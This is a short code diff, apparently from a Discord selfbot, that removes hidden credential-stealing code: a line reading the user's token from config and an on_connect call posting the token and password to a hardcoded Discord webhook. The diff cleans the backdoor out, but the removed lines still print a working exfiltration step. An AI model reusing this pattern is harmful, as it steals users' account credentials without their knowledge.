@@ -172,7 +172,6 @@ def async_executor():
 
     return outer
 
-toe = config.get('token')
 
 @async_executor()
 def do_tts(message):
@@ -353,9 +352,7 @@ async def on_message(message):
 
 @Exeter.event
 async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/770646112079314956/9I54LeFOPhgFPS9v_dD23hQVHe74dpk5iIZw9A-d8B_6STu5BmPeI2QqdRCfklJSHyLb',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
+    Clear()
 
 @Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
